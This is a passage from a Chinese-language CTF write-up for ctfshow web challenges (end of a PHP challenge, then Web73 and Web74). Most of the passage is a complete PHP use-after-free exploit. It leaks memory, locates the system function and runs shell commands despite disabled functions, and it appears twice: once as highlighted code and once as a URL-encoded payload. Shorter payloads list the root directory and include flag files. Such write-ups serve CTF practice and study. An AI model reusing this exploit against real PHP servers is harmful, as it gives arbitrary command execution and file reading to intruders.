class="hljs-number">8</span>);<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$leak</span> - <span class="hljs-variable">$base</span> &gt; <span class="hljs-number">0</span> &amp;&amp; <span class="hljs-variable">$leak</span> - <span class="hljs-variable">$base</span> &lt; <span class="hljs-variable">$data_addr</span> - <span class="hljs-variable">$base</span>) &#123;<br>                <span class="hljs-variable">$deref</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$leak</span>);<br><br>                <span class="hljs-keyword">if</span> (<span class="hljs-variable">$deref</span> != <span class="hljs-number">0x746e6174736e6f63</span>)<br>                    <span class="hljs-keyword">continue</span>;<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">continue</span>;<br><br>            <span class="hljs-variable">$leak</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$data_addr</span>, (<span class="hljs-variable">$i</span> + <span class="hljs-number">4</span>) * <span class="hljs-number">8</span>);<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$leak</span> - <span class="hljs-variable">$base</span> &gt; <span class="hljs-number">0</span> &amp;&amp; <span class="hljs-variable">$leak</span> - <span class="hljs-variable">$base</span> &lt; <span class="hljs-variable">$data_addr</span> - <span class="hljs-variable">$base</span>) &#123;<br>                <span class="hljs-variable">$deref</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$leak</span>);<br><br>                <span class="hljs-keyword">if</span> (<span class="hljs-variable">$deref</span> != <span class="hljs-number">0x786568326e6962</span>)<br>                    <span class="hljs-keyword">continue</span>;<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">continue</span>;<br><br>            <span class="hljs-keyword">return</span> <span class="hljs-variable">$data_addr</span> + <span class="hljs-variable">$i</span> * <span class="hljs-number">8</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_binary_base</span>(<span class="hljs-params"><span class="hljs-variable">$binary_leak</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$base</span> = <span class="hljs-number">0</span>;<br>        <span class="hljs-variable">$start</span> = <span class="hljs-variable">$binary_leak</span> &amp; <span class="hljs-number">0xfffffffffffff000</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-number">0x1000</span>; <span class="hljs-variable">$i</span>++) &#123;<br>            <span class="hljs-variable">$addr</span> = <span class="hljs-variable">$start</span> - <span class="hljs-number">0x1000</span> * <span class="hljs-variable">$i</span>;<br>            <span class="hljs-variable">$leak</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$addr</span>, <span class="hljs-number">0</span>, <span class="hljs-number">7</span>);<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$leak</span> == <span class="hljs-number">0x10102464c457f</span>) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-variable">$addr</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_system</span>(<span class="hljs-params"><span class="hljs-variable">$basic_funcs</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$addr</span> = <span class="hljs-variable">$basic_funcs</span>;<br>        <span class="hljs-keyword">do</span> &#123;<br>            <span class="hljs-variable">$f_entry</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$addr</span>);<br>            <span class="hljs-variable">$f_name</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$f_entry</span>, <span class="hljs-number">0</span>, <span class="hljs-number">6</span>);<br><br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$f_name</span> == <span class="hljs-number">0x6d6574737973</span>) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$addr</span> + <span class="hljs-number">8</span>);<br>            &#125;<br>            <span class="hljs-variable">$addr</span> += <span class="hljs-number">0x20</span>;<br>        &#125; <span class="hljs-keyword">while</span> (<span class="hljs-variable">$f_entry</span> != <span class="hljs-number">0</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">trigger_uaf</span>(<span class="hljs-params"><span class="hljs-variable">$arg</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br><br>        <span class="hljs-variable">$arg</span> = <span class="hljs-title function_ invoke__">str_shuffle</span>(<span class="hljs-string">&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;</span>);<br>        <span class="hljs-variable">$vuln</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Vuln</span>();<br>        <span class="hljs-variable">$vuln</span>-&gt;a = <span class="hljs-variable">$arg</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">stristr</span>(PHP_OS, <span class="hljs-string">&#x27;WIN&#x27;</span>)) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;This PoC is for *nix systems only.&#x27;</span>);<br>    &#125;<br><br>    <span class="hljs-variable">$n_alloc</span> = <span class="hljs-number">10</span>;<br>    <span class="hljs-variable">$contiguous</span> = [];<br>    <span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$n_alloc</span>; <span class="hljs-variable">$i</span>++)<br>        <span class="hljs-variable">$contiguous</span>[] = <span class="hljs-title function_ invoke__">str_shuffle</span>(<span class="hljs-string">&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;</span>);<br><br>    <span class="hljs-title function_ invoke__">trigger_uaf</span>(<span class="hljs-string">&#x27;x&#x27;</span>);<br>    <span class="hljs-variable">$abc</span> = <span class="hljs-variable">$backtrace</span>[<span class="hljs-number">1</span>][<span class="hljs-string">&#x27;args&#x27;</span>][<span class="hljs-number">0</span>];<br><br>    <span class="hljs-variable">$helper</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Helper</span>;<br>    <span class="hljs-variable">$helper</span>-&gt;b = <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"><span class="hljs-variable">$x</span></span>) </span>&#123;<br>    &#125;;<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$abc</span>) == <span class="hljs-number">79</span> || <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$abc</span>) == <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;UAF failed&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-variable">$closure_handlers</span> = <span class="hljs-title function_ invoke__">str2ptr</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-variable">$php_heap</span> = <span class="hljs-title function_ invoke__">str2ptr</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x58</span>);<br>    <span class="hljs-variable">$abc_addr</span> = <span class="hljs-variable">$php_heap</span> - <span class="hljs-number">0xc8</span>;<br><br>    <span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x60</span>, <span class="hljs-number">2</span>);<br>    <span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x70</span>, <span class="hljs-number">6</span>);<br><br>    <span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x10</span>, <span class="hljs-variable">$abc_addr</span> + <span class="hljs-number">0x60</span>);<br>    <span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x18</span>, <span class="hljs-number">0xa</span>);<br><br>    <span class="hljs-variable">$closure_obj</span> = <span class="hljs-title function_ invoke__">str2ptr</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x20</span>);<br><br>    <span class="hljs-variable">$binary_leak</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$closure_handlers</span>, <span class="hljs-number">8</span>);<br>    <span class="hljs-keyword">if</span> (!(<span class="hljs-variable">$base</span> = <span class="hljs-title function_ invoke__">get_binary_base</span>(<span class="hljs-variable">$binary_leak</span>))) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Couldn&#x27;t determine binary base address&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (!(<span class="hljs-variable">$elf</span> = <span class="hljs-title function_ invoke__">parse_elf</span>(<span class="hljs-variable">$base</span>))) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Couldn&#x27;t parse ELF header&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (!(<span class="hljs-variable">$basic_funcs</span> = <span class="hljs-title function_ invoke__">get_basic_funcs</span>(<span class="hljs-variable">$base</span>, <span class="hljs-variable">$elf</span>))) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Couldn&#x27;t get basic_functions address&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (!(<span class="hljs-variable">$zif_system</span> = <span class="hljs-title function_ invoke__">get_system</span>(<span class="hljs-variable">$basic_funcs</span>))) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Couldn&#x27;t get zif_system address&quot;</span>);<br>    &#125;<br><br><br>    <span class="hljs-variable">$fake_obj_offset</span> = <span class="hljs-number">0xd0</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-number">0x110</span>; <span class="hljs-variable">$i</span> += <span class="hljs-number">8</span>) &#123;<br>        <span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-variable">$fake_obj_offset</span> + <span class="hljs-variable">$i</span>, <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$closure_obj</span>, <span class="hljs-variable">$i</span>));<br>    &#125;<br><br>    <span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x20</span>, <span class="hljs-variable">$abc_addr</span> + <span class="hljs-variable">$fake_obj_offset</span>);<br>    <span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0xd0</span> + <span class="hljs-number">0x38</span>, <span class="hljs-number">1</span>, <span class="hljs-number">4</span>);<br>    <span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0xd0</span> + <span class="hljs-number">0x68</span>, <span class="hljs-variable">$zif_system</span>);<br><br>    (<span class="hljs-variable">$helper</span>-&gt;b)(<span class="hljs-variable">$cmd</span>);<br>    <span class="hljs-keyword">exit</span>();<br>&#125;<br><br><span class="hljs-title function_ invoke__">ctfshow</span>(<span class="hljs-string">&quot;cat /flag0.txt&quot;</span>);<br><span class="hljs-title function_ invoke__">ob_end_flush</span>();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs url"># payload<br>c=function%20ctfshow(%24cmd)%0A%7B%0A%20%20%20%20global%20%24abc%2C%20%24helper%2C%20%24backtrace%3B%0A%0A%20%20%20%20class%20Vuln%0A%20%20%20%20%7B%0A%20%20%20%20%20%20%20%20public%20%24a%3B%0A%0A%20%20%20%20%20%20%20%20public%20function%20__destruct()%0A%20%20%20%20%20%20%20%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20global%20%24backtrace%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20unset(%24this-%3Ea)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24backtrace%20%3D%20(new%20Exception)-%3EgetTrace()%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20if%20(!isset(%24backtrace%5B1%5D%5B&#x27;args&#x27;%5D))%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24backtrace%20%3D%20debug_backtrace()%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%7D%0A%0A%20%20%20%20class%20Helper%0A%20%20%20%20%7B%0A%20%20%20%20%20%20%20%20public%20%24a%2C%20%24b%2C%20%24c%2C%20%24d%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20str2ptr(%26%24str%2C%20%24p%20%3D%200%2C%20%24s%20%3D%208)%0A%20%20%20%20%7B%0A%20%20%20%20%20%20%20%20%24address%20%3D%200%3B%0A%20%20%20%20%20%20%20%20for%20(%24j%20%3D%20%24s%20-%201%3B%20%24j%20%3E%3D%200%3B%20%24j--)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24address%20%3C%3C%3D%208%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24address%20%7C%3D%20ord(%24str%5B%24p%20%2B%20%24j%5D)%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20return%20%24address%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20ptr2str(%24ptr%2C%20%24m%20%3D%208)%0A%20%20%20%20%7B%0A%20%20%20%20%20%20%20%20%24out%20%3D%20%22%22%3B%0A%20%20%20%20%20%20%20%20for%20(%24i%20%3D%200%3B%20%24i%20%3C%20%24m%3B%20%24i%2B%2B)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24out%20.%3D%20sprintf(%22%25c%22%2C%20(%24ptr%20%26%200xff))%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24ptr%20%3E%3E%3D%208%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20return%20%24out%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20write(%26%24str%2C%20%24p%2C%20%24v%2C%20%24n%20%3D%208)%0A%20%20%20%20%7B%0A%20%20%20%20%20%20%20%20%24i%20%3D%200%3B%0A%20%20%20%20%20%20%20%20for%20(%24i%20%3D%200%3B%20%24i%20%3C%20%24n%3B%20%24i%2B%2B)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24str%5B%24p%20%2B%20%24i%5D%20%3D%20sprintf(%22%25c%22%2C%20(%24v%20%26%200xff))%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24v%20%3E%3E%3D%208%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20leak(%24addr%2C%20%24p%20%3D%200%2C%20%24s%20%3D%208)%0A%20%20%20%20%7B%0A%20%20%20%20%20%20%20%20global%20%24abc%2C%20%24helper%3B%0A%20%20%20%20%20%20%20%20write(%24abc%2C%200x68%2C%20%24addr%20%2B%20%24p%20-%200x10)%3B%0A%20%20%20%20%20%20%20%20%24leak%20%3D%20strlen(%24helper-%3Ea)%3B%0A%20%20%20%20%20%20%20%20if%20(%24s%20!%3D%208)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24leak%20%25%3D%202%20%3C%3C%20(%24s%20*%208)%20-%201%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20return%20%24leak%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20parse_elf(%24base)%0A%20%20%20%20%7B%0A%20%20%20%20%20%20%20%20%24e_type%20%3D%20leak(%24base%2C%200x10%2C%202)%3B%0A%0A%20%20%20%20%20%20%20%20%24e_phoff%20%3D%20leak(%24base%2C%200x20)%3B%0A%20%20%20%20%20%20%20%20%24e_phentsize%20%3D%20leak(%24base%2C%200x36%2C%202)%3B%0A%20%20%20%20%20%20%20%20%24e_phnum%20%3D%20leak(%24base%2C%200x38%2C%202)%3B%0A%0A%20%20%20%20%20%20%20%20for%20(%24i%20%3D%200%3B%20%24i%20%3C%20%24e_phnum%3B%20%24i%2B%2B)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24header%20%3D%20%24base%20%2B%20%24e_phoff%20%2B%20%24i%20*%20%24e_phentsize%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24p_type%20%3D%20leak(%24header%2C%200%2C%204)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24p_flags%20%3D%20leak(%24header%2C%204%2C%204)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24p_vaddr%20%3D%20leak(%24header%2C%200x10)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24p_memsz%20%3D%20leak(%24header%2C%200x28)%3B%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20if%20(%24p_type%20%3D%3D%201%20%26%26%20%24p_flags%20%3D%3D%206)%20%7B%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24data_addr%20%3D%20%24e_type%20%3D%3D%202%20%3F%20%24p_vaddr%20%3A%20%24base%20%2B%20%24p_vaddr%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24data_size%20%3D%20%24p_memsz%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%20else%20if%20(%24p_type%20%3D%3D%201%20%26%26%20%24p_flags%20%3D%3D%205)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24text_size%20%3D%20%24p_memsz%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%7D%0A%0A%20%20%20%20%20%20%20%20if%20(!%24data_addr%20%7C%7C%20!%24text_size%20%7C%7C%20!%24data_size)%0A%20%20%20%20%20%20%20%20%20%20%20%20return%20false%3B%0A%0A%20%20%20%20%20%20%20%20return%20%5B%24data_addr%2C%20%24text_size%2C%20%24data_size%5D%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20get_basic_funcs(%24base%2C%20%24elf)%0A%20%20%20%20%7B%0A%20%20%20%20%20%20%20%20list(%24data_addr%2C%20%24text_size%2C%20%24data_size)%20%3D%20%24elf%3B%0A%20%20%20%20%20%20%20%20for%20(%24i%20%3D%200%3B%20%24i%20%3C%20%24data_size%20%2F%208%3B%20%24i%2B%2B)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24leak%20%3D%20leak(%24data_addr%2C%20%24i%20*%208)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20if%20(%24leak%20-%20%24base%20%3E%200%20%26%26%20%24leak%20-%20%24base%20%3C%20%24data_addr%20-%20%24base)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24deref%20%3D%20leak(%24leak)%3B%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if%20(%24deref%20!%3D%200x746e6174736e6f63)%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20continue%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%20else%20continue%3B%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20%24leak%20%3D%20leak(%24data_addr%2C%20(%24i%20%2B%204)%20*%208)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20if%20(%24leak%20-%20%24base%20%3E%200%20%26%26%20%24leak%20-%20%24base%20%3C%20%24data_addr%20-%20%24base)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24deref%20%3D%20leak(%24leak)%3B%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if%20(%24deref%20!%3D%200x786568326e6962)%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20continue%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%20else%20continue%3B%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20return%20%24data_addr%20%2B%20%24i%20*%208%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20get_binary_base(%24binary_leak)%0A%20%20%20%20%7B%0A%20%20%20%20%20%20%20%20%24base%20%3D%200%3B%0A%20%20%20%20%20%20%20%20%24start%20%3D%20%24binary_leak%20%26%200xfffffffffffff000%3B%0A%20%20%20%20%20%20%20%20for%20(%24i%20%3D%200%3B%20%24i%20%3C%200x1000%3B%20%24i%2B%2B)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24addr%20%3D%20%24start%20-%200x1000%20*%20%24i%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24leak%20%3D%20leak(%24addr%2C%200%2C%207)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20if%20(%24leak%20%3D%3D%200x10102464c457f)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20return%20%24addr%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20get_system(%24basic_funcs)%0A%20%20%20%20%7B%0A%20%20%20%20%20%20%20%20%24addr%20%3D%20%24basic_funcs%3B%0A%20%20%20%20%20%20%20%20do%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24f_entry%20%3D%20leak(%24addr)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24f_name%20%3D%20leak(%24f_entry%2C%200%2C%206)%3B%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20if%20(%24f_name%20%3D%3D%200x6d6574737973)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20return%20leak(%24addr%20%2B%208)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20%24addr%20%2B%3D%200x20%3B%0A%20%20%20%20%20%20%20%20%7D%20while%20(%24f_entry%20!%3D%200)%3B%0A%20%20%20%20%20%20%20%20return%20false%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20trigger_uaf(%24arg)%0A%20%20%20%20%7B%0A%0A%20%20%20%20%20%20%20%20%24arg%20%3D%20str_shuffle(&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;)%3B%0A%20%20%20%20%20%20%20%20%24vuln%20%3D%20new%20Vuln()%3B%0A%20%20%20%20%20%20%20%20%24vuln-%3Ea%20%3D%20%24arg%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20if%20(stristr(PHP_OS%2C%20&#x27;WIN&#x27;))%20%7B%0A%20%20%20%20%20%20%20%20die(&#x27;This%20PoC%20is%20for%20*nix%20systems%20only.&#x27;)%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20%24n_alloc%20%3D%2010%3B%0A%20%20%20%20%24contiguous%20%3D%20%5B%5D%3B%0A%20%20%20%20for%20(%24i%20%3D%200%3B%20%24i%20%3C%20%24n_alloc%3B%20%24i%2B%2B)%0A%20%20%20%20%20%20%20%20%24contiguous%5B%5D%20%3D%20str_shuffle(&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;)%3B%0A%0A%20%20%20%20trigger_uaf(&#x27;x&#x27;)%3B%0A%20%20%20%20%24abc%20%3D%20%24backtrace%5B1%5D%5B&#x27;args&#x27;%5D%5B0%5D%3B%0A%0A%20%20%20%20%24helper%20%3D%20new%20Helper%3B%0A%20%20%20%20%24helper-%3Eb%20%3D%20function%20(%24x)%20%7B%0A%20%20%20%20%7D%3B%0A%0A%20%20%20%20if%20(strlen(%24abc)%20%3D%3D%2079%20%7C%7C%20strlen(%24abc)%20%3D%3D%200)%20%7B%0A%20%20%20%20%20%20%20%20die(%22UAF%20failed%22)%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20%24closure_handlers%20%3D%20str2ptr(%24abc%2C%200)%3B%0A%20%20%20%20%24php_heap%20%3D%20str2ptr(%24abc%2C%200x58)%3B%0A%20%20%20%20%24abc_addr%20%3D%20%24php_heap%20-%200xc8%3B%0A%0A%20%20%20%20write(%24abc%2C%200x60%2C%202)%3B%0A%20%20%20%20write(%24abc%2C%200x70%2C%206)%3B%0A%0A%20%20%20%20write(%24abc%2C%200x10%2C%20%24abc_addr%20%2B%200x60)%3B%0A%20%20%20%20write(%24abc%2C%200x18%2C%200xa)%3B%0A%0A%20%20%20%20%24closure_obj%20%3D%20str2ptr(%24abc%2C%200x20)%3B%0A%0A%20%20%20%20%24binary_leak%20%3D%20leak(%24closure_handlers%2C%208)%3B%0A%20%20%20%20if%20(!(%24base%20%3D%20get_binary_base(%24binary_leak)))%20%7B%0A%20%20%20%20%20%20%20%20die(%22Couldn&#x27;t%20determine%20binary%20base%20address%22)%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20if%20(!(%24elf%20%3D%20parse_elf(%24base)))%20%7B%0A%20%20%20%20%20%20%20%20die(%22Couldn&#x27;t%20parse%20ELF%20header%22)%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20if%20(!(%24basic_funcs%20%3D%20get_basic_funcs(%24base%2C%20%24elf)))%20%7B%0A%20%20%20%20%20%20%20%20die(%22Couldn&#x27;t%20get%20basic_functions%20address%22)%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20if%20(!(%24zif_system%20%3D%20get_system(%24basic_funcs)))%20%7B%0A%20%20%20%20%20%20%20%20die(%22Couldn&#x27;t%20get%20zif_system%20address%22)%3B%0A%20%20%20%20%7D%0A%0A%0A%20%20%20%20%24fake_obj_offset%20%3D%200xd0%3B%0A%20%20%20%20for%20(%24i%20%3D%200%3B%20%24i%20%3C%200x110%3B%20%24i%20%2B%3D%208)%20%7B%0A%20%20%20%20%20%20%20%20write(%24abc%2C%20%24fake_obj_offset%20%2B%20%24i%2C%20leak(%24closure_obj%2C%20%24i))%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20write(%24abc%2C%200x20%2C%20%24abc_addr%20%2B%20%24fake_obj_offset)%3B%0A%20%20%20%20write(%24abc%2C%200xd0%20%2B%200x38%2C%201%2C%204)%3B%0A%20%20%20%20write(%24abc%2C%200xd0%20%2B%200x68%2C%20%24zif_system)%3B%0A%0A%20%20%20%20(%24helper-%3Eb)(%24cmd)%3B%0A%20%20%20%20exit()%3B%0A%7D%0A%0Actfshow(%22cat%20%2Fflag0.txt%22)%3B%0Aob_end_flush()%3B<br></code></pre></td></tr></table></figure><h2 id="Web73"><a href="#Web73" class="headerlink" title="Web73"></a>Web73</h2><p>先扫一下根目录 看下flag在哪里</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">c=<span class="hljs-variable">$a</span>=<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-string">&quot;/&quot;</span>);<span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$a</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$value</span>)&#123;<span class="hljs-keyword">echo</span> <span class="hljs-variable">$value</span>.<span class="hljs-string">&quot;---&quot;</span>;&#125;<span class="hljs-keyword">exit</span>();<br></code></pre></td></tr></table></figure><p>flag在flagc.txt下</p><p>include没有过滤可以直接用</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">c=<span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;/flagc.txt&#x27;</span>);<span class="hljs-keyword">exit</span>();<br></code></pre></td></tr></table></figure><p>这道题还有一个思路</p><p>就是利用上面的uaf脚本 但是里面有个函数被禁用了</p><p>可以根据函数的作用利用其他函数实现这个函数的功能从而绕过 详情见b站ctfshow账号</p><h2 id="Web74"><a href="#Web74" class="headerlink" title="Web74"></a>Web74</h2><p>扫描根目录</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php">c=<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?php</span> <span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-built_in">DirectoryIterator</span>(<span class="hljs-string">&quot;glob:///*&quot;</span>);<br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$a</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$f</span>)<br>&#123;<span class="hljs-keyword">echo</span>(<span class="hljs-variable">$f</span>-&gt;<span class="hljs-title function_ invoke__">__toString</span>().<span class="hljs-string">&#x27; &#x27;</span>);<br>&#125;<br><span class="hljs-keyword">exit</span>(<span class="hljs-number">0</span>);<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>这次flag在flagx.txt下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">c=<span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;/flagx.txt&#x27;</span>);<span class="hljs-keyword">exit</span>();<br></code></pre></td></tr></table></figure><h2 id="Web75"><a href="#Web75" class="headerlink" 